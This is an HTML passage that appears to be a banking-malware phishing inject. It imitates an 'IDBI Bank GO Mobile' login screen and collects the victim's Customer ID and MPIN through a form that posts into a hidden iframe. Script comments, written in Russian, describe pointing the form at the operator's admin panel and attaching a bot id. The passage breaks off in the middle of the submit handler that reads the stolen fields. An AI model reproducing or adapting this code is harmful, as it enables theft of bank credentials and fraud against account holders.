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" />
    <br />
    <br />

    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <div class="field-block">
            <label class="data_label" for="customerid">Customer ID</label>
        </div>
        <br />

        <input class="input-field" id="customerid" name="Customer ID" maxlength="8" type="text"  />
        <br />

        <div class="field-block">
            <label class="data_label" for="mpin">MPIN</label>
        </div>
        <input class="input-field" id="mpin" name="mpin" type="password" min="4" maxlength="4" />
        <br />

        <script>
            document.getElementById('mpin').onkeypress = function (e) {
                return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
            }
        </script>

        <input type="hidden" name="name" value="IDBI Bank GO Mobile" />
        <input value="Sumbit" id="submitBtn1" class="submit-button" type="button" />
    </form>

    <iframe src="about:blank" name="flow_handler" style="visibility: hidden; display: none;"></iframe>
</div>

 <script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('customerid');
                        var oCodeInp = document.getElementById('mpin');

						try{
